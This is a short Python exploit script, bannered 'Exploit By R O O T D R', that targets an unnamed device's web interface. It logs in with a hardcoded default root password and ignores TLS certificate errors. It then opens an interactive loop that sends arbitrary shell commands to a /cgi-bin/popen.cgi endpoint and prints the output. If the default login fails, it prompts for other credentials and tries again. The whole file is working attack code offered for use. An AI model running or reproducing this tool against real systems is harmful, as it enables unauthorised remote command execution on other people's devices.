from http import cookies
from urllib import response
import requests
import sys
import json
import urllib3

target = sys.argv[1]

def print_banner():
    banner = "Exploit By R O O T D R " 
    print(banner)

print_banner()
username = "root"
password = "2wsx#EDC"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def sendCommand(command,cookie):
    global target
    result = requests.get("https://"+target+"/cgi-bin/popen.cgi",cookies={"mgs":cookie},params = {"command":command},verify=False).text
    return result.replace("<br>","\n")


while True:
    response = requests.post("https://"+target+"/api/login",data = {"user":username,"pass":password},verify=False)
    
    authResult = json.loads(response.text)
    if("ok" in authResult and authResult["ok"]):
        token = response.cookies["mgs"]
        print("[+] Authention Success")
        while True:
            command = input("Command> ")
            print(sendCommand(command,token))

        break
    else:
        print("Default Authentication Failed! Enter correct username and password.. ")

        username = input("Username: ")
        password = input("Password: ")
